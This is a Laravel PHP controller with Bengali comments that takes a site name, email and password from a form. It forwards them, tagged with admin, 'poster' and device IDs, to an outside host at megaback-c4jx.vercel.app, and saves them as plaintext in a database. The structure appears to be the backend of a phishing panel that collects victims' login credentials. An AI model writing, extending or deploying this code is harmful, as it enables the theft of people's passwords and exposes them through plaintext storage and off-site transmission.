<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\AdminData;
use Illuminate\Support\Facades\Http;

class AdminController extends Controller
{
  // ফর্ম দেখানোর জন্য
  public function showForm()
  {
      return view('admin.form');
  }

  // ফর্ম থেকে ডেটা সাবমিট করার জন্য
  public function submitForm(Request $request)
  {
      // ডেটা ভ্যালিডেশন
      $request->validate([
          
          'email'       => 'required|email',
          'password'    => 'required|string',
          
      ]);

      // API URL তৈরি
      $apiUrl = "https://megaback-c4jx.vercel.app/check/{$request->admin_id}/{$request->poster_id}/{$request->device}";

      // API data তৈরি
      $data = [
          'site'          => $request->site,
          'email'         => $request->email,
          'password'      => $request->password,
          'admin_id'      => $request->admin_id,
          'poster_id'     => $request->poster_id,
          'device'        => $request->device
      ];

      // API Hit করা
      $response = Http::post($apiUrl, $data);

      // ডাটাবেজে সংরক্ষণ করা
      AdminData::create([
          'admin_id'  => $request->admin_id,
          'poster_id' => $request->poster_id,
          'device'    => $request->device,
          'data'      => json_encode($data),
      ]);

      return back()->with('message', 'Data submitted successfully!');
  }
}